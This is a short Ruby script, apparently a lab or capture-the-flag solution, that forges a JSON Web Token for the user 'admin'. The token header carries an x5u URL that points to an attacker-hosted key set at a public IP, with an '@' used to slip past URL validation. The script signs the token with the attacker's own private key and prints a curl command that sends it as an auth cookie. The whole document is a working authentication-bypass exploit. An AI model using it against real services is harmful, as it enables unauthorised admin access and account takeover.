
header = {"typ":"JWT","alg":"RS256","x5u":"http://[URL]@[PUBLIC_IP]/jwks_with_x5c.json"}
body = {"user":"admin"}

require 'base64'
require 'json'
require 'openssl'

k = OpenSSL::PKey::RSA.new File.read "private.pem"

data = Base64.urlsafe_encode64(header.to_json, padding: false)+"."+Base64.urlsafe_encode64(body.to_json, padding: false)
signature = k.sign("SHA256", data)

puts "curl -H 'Cookie: auth=#{data}.#{Base64.urlsafe_encode64(signature, padding: false)}' http://[URL]/"
